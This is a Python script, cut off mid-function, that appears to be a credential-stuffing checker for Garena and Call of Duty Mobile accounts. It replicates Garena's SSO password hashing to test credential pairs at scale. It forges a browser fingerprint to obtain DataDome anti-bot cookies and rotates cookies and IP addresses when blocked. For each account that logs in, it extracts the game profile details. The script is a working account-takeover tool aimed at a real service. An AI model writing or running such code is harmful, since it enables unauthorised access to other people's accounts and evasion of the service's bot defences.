import os
import sys
import time
import random
import re
import json
import hashlib
import logging
import threading
import signal
import importlib
import zipfile
import tarfile
import subprocess
import codecs
import platform
import uuid
from datetime import datetime as dt
from datetime import datetime
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# ==========================
# Auto Module Installer
# ==========================
import subprocess
import sys
import importlib

required_modules = [
    "requests",
    "cloudscraper",
    "pycryptodome",
    "beautifulsoup4",
    "fake_useragent",
    "colorama",
    "termcolor",
    "rich",
    "pyfiglet",
    "urllib3"
]

def install_module(module_name):
    """Safely install a missing module using pip."""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
        print(f"[+] Installed {module_name}")
    except Exception as e:
        print(f"[-] Failed to install {module_name}: {e}")

def ensure_modules():
    """Ensure all required modules are installed."""
    for mod in required_modules:
        try:
            importlib.import_module(mod)
        except ImportError:
            print(f"[!] Missing module: {mod} — installing...")
            install_module(mod)

ensure_modules()

# ==========================
# Imports after ensuring modules
# ==========================
import requests
import cloudscraper
from Crypto.Cipher import AES
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

import colorama
from colorama import Fore, Style, Back, init
from termcolor import colored
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import DOUBLE, ROUNDED
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.text import Text
import pyfiglet

# ✅ Added correct urllib imports
import urllib.request
import urllib.parse
import urllib.error

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)
colorama.init()

console = Console()

def print_banner(text="ML Account Selector"):
    banner = pyfiglet.figlet_format(text, font="slant")
    console.print(f"[bold cyan]{banner}[/bold cyan]")

shamp_file = "shamp.txt"
FONT_FILE = "selected_font.txt"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ANSI color codes
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[94m', '\033[01;35m'
cn, k, g = '\033[00;36m', '\033[90m', '\033[38;5;130m'
tr = f'{rd}[{gn}+{rd}]{gn}'
fls = f'{rd}[{lrd}-{rd}]{lrd}'

try:
    import zlib
    import gzip
    import lzma
    import base64
    import marshal
    import py_compile
except Exception as F:
    print(f"{fls} Module Error {F}\n\nTo install the missing module, run:\n{k}pip install {F}")

def clear():
    if 'Windows' in __import__("platform").uname():
        os.system("cls")
    else:
        os.system("clear")

if sys.version_info[0] == 2:
    _input = "raw_input('%s')"
elif sys.version_info[0] == 3:
    _input = "input('%s')"
else:
    sys.exit(f"\n{fls} Your Python Version is not Supported!")

# Encoding functions
zlb = lambda in_: zlib.compress(in_)
b16 = lambda in_: base64.b16encode(in_)
b32 = lambda in_: base64.b32encode(in_)
b64 = lambda in_: base64.b64encode(in_)
gzi = lambda in_: gzip.compress(in_)
lzm = lambda in_: lzma.compress(in_)
mar = lambda in_: marshal.dumps(compile(in_, '<x>', 'exec'))

# ==========================
# Color setup and logging
# ==========================
from colorama import Fore, Style, init
init(autoreset=True)

# Safe global color variables
try:
    ERROR_RED
except NameError:
    ERROR_RED = Fore.RED + Style.BRIGHT
try:
    SUCCESS_GREEN
except NameError:
    SUCCESS_GREEN = Fore.GREEN + Style.BRIGHT
try:
    INFO_CYAN
except NameError:
    INFO_CYAN = Fore.CYAN + Style.BRIGHT

# Make them available globally
globals().update({
    "ERROR_RED": ERROR_RED,
    "SUCCESS_GREEN": SUCCESS_GREEN,
    "INFO_CYAN": INFO_CYAN
})

class Colors:
    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
    WHITE = colorama.Fore.WHITE
    BLUE = colorama.Fore.BLUE
    GREEN = colorama.Fore.GREEN
    RED = colorama.Fore.RED
    CYAN = colorama.Fore.CYAN
    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
    RESET = colorama.Style.RESET_ALL 

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': '\033[38;5;222m',
        'INFO': Colors.WHITE,
        'WARNING': '\033[38;5;208m',
        'ERROR': '\033[38;5;196m',
        'CRITICAL': '\033[48;5;208;38;5;255m',
        'ORANGE': '\033[38;5;208m',
        'PURPLE': '\033[38;5;93m',
        'NAVY': '\033[38;5;17m',
        'GREY': '\033[38;5;238m'
    }
    RESET = Colors.RESET

    def format(self, record):
        message = super().format(record)
        color = self.COLORS.get(record.levelname, self.RESET)
        return f"{color}{message}{self.RESET}"

# Setup logger
logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)

# Reduce verbosity of third-party loggers
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

# ==========================
# Utility Functions
# ==========================
def PerfectBox(title: str, body: str, color: str = "cyan", icon: str = "📦"):
    """Display stylized panel matching LEGIThea theme"""
    console.print(
        Panel(
            f"[white]{body}[/white]",
            title=f"{icon} {title}",
            title_align="center",
            border_style=color,
            box=DOUBLE,
            padding=(1, 3),
        )
    )


        
class GracefulThreadPoolExecutor(ThreadPoolExecutor):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._shutdown = False
        
    def shutdown(self, wait=True, *, cancel_futures=False):
        self._shutdown = True
        super().shutdown(wait=wait, cancel_futures=cancel_futures)

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
        
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')
    
    def get_valid_cookie(self):
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                valid_cookies = [c for c in f.read().splitlines() 
                               if c.strip() and not self.is_banned(c.strip())]
            if valid_cookies:
                return random.choice(valid_cookies)
        return None
    
    def save_cookie(self, cookie):
        if not self.is_banned(cookie):
            with open('fresh_cookies.txt', 'a') as f:
                f.write(cookie + '\n')
            return True
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
            return False

    def get_current_ip(self):
        """Get current public IP address with multiple fallback services"""
        ip_services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:  
                        return ip
            except Exception:
                continue
        
        logger.warning(f"[WARNING] Could not fetch IP from any service")
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        """Wait for IP address to change AUTOMATICALLY"""
        logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
        
        original_ip = self.get_current_ip()
        if not original_ip:
            logger.warning(f"[WARNING] Could not determine current IP, waiting 60 seconds")
            time.sleep(10)
            return True
            
        logger.info(f"[𝙄𝙉𝙁𝙊] Current IP: {original_ip}")
        logger.info(f"[𝙄𝙉𝙁𝙊] Waiting for IP change (checking every {check_interval} seconds, max {max_wait_time//60} minutes)...")
        
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < max_wait_time:
            attempts += 1
            current_ip = self.get_current_ip()
            
            if current_ip and current_ip != original_ip:
                logger.info(f"[SUCCESS] IP changed from {original_ip} to {current_ip}")
                logger.info(f"[𝙄𝙉𝙁𝙊] IP changed successfully after {attempts} checks!")
                return True
            else:
                if attempts % 5 == 0:  
                    logger.info(f"[𝙄𝙉𝙁𝙊] IP check {attempts}: Still {original_ip} -> Auto-retrying...")
                time.sleep(check_interval)
        
        logger.warning(f"[WARNING] IP did not change after {max_wait_time} seconds")
        return False

    def handle_403(self, session):
        self._403_attempts += 1
        
        if self._403_attempts >= 3:
            logger.error(f"[ERROR] IP blocked after 3 attempts.")
            logger.error(f"[𝙄𝙉𝙁𝙊] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
            logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
            
            if self.wait_for_ip_change(session):
                logger.info(f"[SUCCESS] IP changed, fetching new DataDome cookie...")
                
                self._403_attempts = 0
                
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    logger.info(f"[SUCCESS] New DataDome cookie obtained")
                    return True
                else:
                    logger.error(f"[ERROR] Failed to fetch new DataDome after IP change")
                    return False
            else:
                logger.error(f"[ERROR] IP did not change, cannot continue")
                return False
        return False

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.lock = threading.Lock()
        
    def update_stats(self, valid=False, clean=False, has_codm=False):
        with self.lock:
            if valid:
                self.valid_count += 1
            else:
                self.invalid_count += 1
            if clean:
                self.clean_count += 1
            else:
                self.not_clean_count += 1
            if has_codm:
                self.has_codm_count += 1
            else:
                if valid:
                    self.no_codm_count += 1
                
    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count
            }
            
    def display_stats(self):
        stats = self.get_stats()
        bright_blue = '\033[94m'
        reset_color = '\033[0m'
        return f"{bright_blue}[LIVE STATS] VALID [{stats['valid']}] | INVALID [{stats['invalid']}] | CLEAN [{stats['clean']}] | NOT CLEAN [{stats['not_clean']}] | HAS CODM [{stats['has_codm']}] | NO CODM [{stats['no_codm']}] -> config @Kinzopalku{reset_color}"

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value
            except (ValueError, IndexError):
                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
        else:
            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
    
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} cookies")
    else:
        logger.warning(f"[WARNING] No valid cookies found in the provided string")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst":76.70000004768372,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","wbd":False,"dp0":True,"tagpu":5.738121195951787,"wdif":False,"wdifrm":False,"npmtm":False,"br_h":738,"br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,"nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,"str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,"plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,"hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,"lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,"vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf","plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF","hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably","acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,"acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,"acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably","acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,"vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,"vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,"dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,"tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            print(f"{ERROR_RED}DataDome cookie not found in response. Status code: {response_json['status']}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"{ERROR_RED}Error getting DataDome cookie: {e}")
        return None

def prelogin(session, account, datadome_manager):
    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    retries = 3
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            
            if cookie_header:
                headers['cookie'] = cookie_header
            
            logger.info(f"[PRELOGIN] Attempt {attempt + 1}/{retries} for {account}")
            
            response = session.get(url, headers=headers, params=params, timeout=30)
            
            new_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
            
            new_datadome = new_cookies.get('datadome')
            
            if response.status_code == 403:
                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
                
                if new_cookies and attempt < retries - 1:
                    logger.info(f"[RETRY] Got new cookies from 403, retrying...")
                    time.sleep(2)
                    continue
                
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                else:
                    logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
                    return None, None, new_datadome
                
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from prelogin for {account}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            
            if 'error' in data:
                logger.error(f"[ERROR] Prelogin error for {account}: {data['error']}")
                return None, None, new_datadome
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                logger.error(f"[ERROR] Missing v1 or v2 in prelogin response for {account}")
                return None, None, new_datadome
                
            logger.info(f"[SUCCESS] Prelogin successful: {account}")
            
            return v1, v2, new_datadome
            
        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
                    
                    new_cookies = {}
                    if 'set-cookie' in e.response.headers:
                        set_cookie_header = e.response.headers['set-cookie']
                        for cookie_str in set_cookie_header.split(','):
                            if '=' in cookie_str:
                                try:
                                    cookie_name = cookie_str.split('=')[0].strip()
                                    cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                    if cookie_name and cookie_value:
                                        new_cookies[cookie_name] = cookie_value
                                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                                        if cookie_name == 'datadome':
                                            datadome_manager.set_datadome(cookie_value)
                                except Exception as ex:
                                    pass
                    
                    if new_cookies and attempt < retries - 1:
                        logger.info(f"[RETRY] Retrying with new cookies from 403...")
                        time.sleep(2)
                        continue
                    
                    if datadome_manager.handle_403(session):
                        return "IP_BLOCKED", None, None
                    else:
                        logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
                        return None, None, new_cookies.get('datadome')
                        
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return None, None, new_cookies.get('datadome')
                else:
                    logger.error(f"[ERROR] HTTP error {e.response.status_code} fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
            else:
                logger.error(f"[ERROR] HTTP error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
                
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except Exception as e:
            logger.error(f"[ERROR] Error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None, None, None

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    if cookie_header:
        headers['cookie'] = cookie_header
    
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            
            login_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from login for {account}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                logger.error(f"[ERROR] Login failed for {account}: {error_msg}")
                
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    logger.warning(f"[WARNING] Authentication error - likely invalid credentials for {account}")
                    return None
                elif 'captcha' in error_msg.lower():
                    logger.warning(f"[WARNING] Captcha required for {account}")
                    time.sleep(3)
                    continue
                    
            return sso_key
            
        except requests.RequestException as e:
            logger.error(f"[ERROR] Login request failed for {account} (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        token_url = "https://auth.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
        }
        token_data = "client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=" + random_id
        
        token_response = session.post(token_url, headers=token_headers, data=token_data)
        token_data = token_response.json()
        return token_data.get("access_token", "")
    except Exception as e:
        logger.error(f"[ERROR] Error getting CODM access token: {e}")
        return ""

def process_codm_callback(session, access_token):
    try:
        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
        
        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
        location = api_callback_response.headers.get("Location", "")
        
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        else:
            return None, "unknown_error"
            
    except Exception as e:
        logger.error(f"[ERROR] Error processing CODM callback: {e}")
        return None, "error"

def get_codm_user_info(session, token):
    try:
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd",
            "cache-control": "no-cache",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "pragma": "no-cache",
            "referer": "https://delete-request.codm.garena.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        
        check_response = session.get(check_login_url, headers=check_headers)
        check_data = check_response.json()
        
        user_data = check_data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"),
                "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
        
    except Exception as e:
        logger.error(f"❌ Error getting CODM user info: {e}")
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    
    try:
        access_token = get_codm_access_token(session)
        if not access_token:
            logger.warning(f"⚠️ No CODM access token for {account}")
            return has_codm, codm_info
        
        codm_token, status = process_codm_callback(session, access_token)
        
        if status == "no_codm":
            logger.info(f"⚠️ No CODM detected for {account}")
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            logger.warning(f"⚠️ CODM callback failed for {account}: {status}")
            return has_codm, codm_info
        
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
            logger.info(f"✅ CODM detected for {account}: Level {codm_info.get('codm_level', 'N/A')}")
            
    except Exception as e:
        logger.error(f"❌ Error checking CODM for {account}: {e}")
    
    return has_codm, codm_info

def display_codm_info(account_details, codm_info):
    if not codm_info:
        return ""
    
    if isinstance(account_details, str):
        account_details = {
            'username': account_details,
